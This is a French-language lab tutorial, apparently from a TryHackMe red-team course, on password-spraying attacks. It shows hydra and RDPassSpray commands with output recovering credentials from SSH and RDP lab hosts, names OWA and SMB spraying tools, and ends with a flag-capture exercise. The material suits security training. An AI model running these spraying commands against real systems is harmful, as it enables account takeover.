Attaque par pulvérisation de mot de passe
======================================

Cette tâche enseignera les bases d'une attaque par pulvérisation de mot de passe et les outils nécessaires pour exécuter divers scénarios d'attaque contre des services en ligne courants.

La pulvérisation de mots de passe est une technique efficace utilisée pour identifier les informations d'identification valides. De nos jours, la pulvérisation de mot de passe est considérée comme l'une des attaques de mot de passe courantes pour découvrir des mots de passe faibles. Cette technique peut être utilisée contre divers services en ligne et systèmes d'authentification, tels que SSH, SMB, RDP, SMTP, Outlook Web Application, etc. Une attaque par force brute cible un nom d'utilisateur spécifique pour essayer de nombreux mots de passe faibles et prévisibles. Alors qu'une attaque par pulvérisation de mot de passe cible de nombreux noms d'utilisateur en utilisant un mot de passe faible commun, cela pourrait aider à éviter une politique de verrouillage de compte. La figure suivante explique le concept d'attaques par pulvérisation de mot de passe où l'attaquant utilise un mot de passe commun contre plusieurs utilisateurs.

![17bdbbc66c5924d99823be70e98832ed](https://github.com/dsgsec/Red-Team/assets/82456829/516a043a-6f89-4735-aac7-c3b55360bd5c)

Les mots de passe courants et faibles suivent souvent un modèle et un format. Certains mots de passe couramment utilisés et leur format général se trouvent ci-dessous.

-   La saison en cours suivie de l'année en cours (SeasonYear). Par exemple, Automne 2020 , Printemps 2021 , etc.
-   Le mois en cours suivi de l'année en cours (MonthYear). Par exemple, novembre2020 , mars2021 , etc.
-   Utiliser le nom de l'entreprise avec des nombres aléatoires (CompanyNameNumbers). Par exemple,  TryHackMe01 ,  TryHackMe02 .

Si une politique de complexité des mots de passe est appliquée au sein de l'organisation, nous devrons peut-être créer un mot de passe qui inclut des symboles pour répondre à l'exigence, comme  Octobre2021 ! ,  printemps 2021 ! , October2021@ ,  etc.  Pour réussir l'attaque par pulvérisation de mot de passe, nous devons énumérer la cible et créer une liste de noms d'utilisateur valides (ou une liste d'adresses e-mail) . 

Ensuite, nous appliquerons la technique de pulvérisation de mot de passe en utilisant différents scénarios contre divers services, notamment :

-   SSH
-   RDP
-   Portail d'accès Web Outlook (OWA)

-   PME

### SSH

Supposons que nous ayons déjà énuméré le système et créé une liste de noms d'utilisateur valides.

Chat de hachis

```
user@THM:~# cat usernames-list.txt
admin
victim
dummy
adm
sammy

```

Ici, nous pouvons utiliser  hydra  pour effectuer l'attaque par pulvérisation de mot de passe contre le service SSH en utilisant le  mot de passe Spring2021  .

Chat de hachis

```
user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found

```

Notez que  L  doit charger la liste des noms d'utilisateur valides et  -p  utilise le  mot de passe Spring2021  contre le service SSH à  10.1.1.10 . La sortie ci-dessus montre que nous avons réussi à trouver les informations d'identification.

### RDP

Supposons que nous ayons trouvé un service RDP exposé sur le port 3026. Nous pouvons utiliser un outil tel que  [RDPassSpray](https://github.com/xFreed0m/RDPassSpray)  pour pulvériser un mot de passe contre RDP. Tout d'abord, installez l'outil sur votre machine attaquante en suivant les instructions d'installation du référentiel GitHub de l'outil. En tant que nouvel utilisateur de cet outil, nous allons commencer par exécuter la  commande python3 RDPassSpray.py -h  pour voir comment les outils peuvent être utilisés :

Chat de hachis

```
user@THM:~# python3 RDPassSpray.py -h
usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -U USERLIST, --userlist USERLIST
                        Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                        Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                        Targets list to use, one target per line
  -t TARGET, --target TARGET
                        Target machine to authenticate against
  -s SLEEP, --sleep SLEEP
                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                        Domain name to use
  -n NAMES, --names NAMES
                        Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                        Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts

```

Maintenant, essayons d'utiliser l'option (-u) pour spécifier la  victime  comme nom d'utilisateur et l'option (-p) définit le  Spring2021 ! . L'option (-t) consiste à sélectionner un seul hôte à attaquer .

Chat de hachis

```
user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!

```

La sortie ci-dessus montre que nous avons réussi à trouver des informations d'identification valides  victim:Spring2021 ! .  Notez que nous pouvons spécifier un nom de domaine en utilisant l'  option -d  si nous sommes dans un environnement Active Directory .

Chat de hachis

```
user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```

Il existe divers outils qui effectuent une attaque par pulvérisation de mot de passe contre différents services, tels que :

### Portail d'accès Web Outlook (OWA)

Outils:

-   [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)  (atomizer.py)
-   [MailSniper](https://github.com/dafthack/MailSniper)

### PME

-   Outil : Metasploit (auxiliaire/scanner/smb/smb_login)

Répondre aux questions ci-dessous

Utilisez la liste de noms d'utilisateur suivante :

Attaque par pulvérisation de mot de passe !

```
user@THM:~# cat usernames-list.txt
admin
phillips
burgess
pittman
guess
```

Effectuez une  attaque par pulvérisation de mot de passe  pour accéder au   serveur  SSH://MACHINE_IP afin de lire /etc/flag . Quel est le drapeau ?
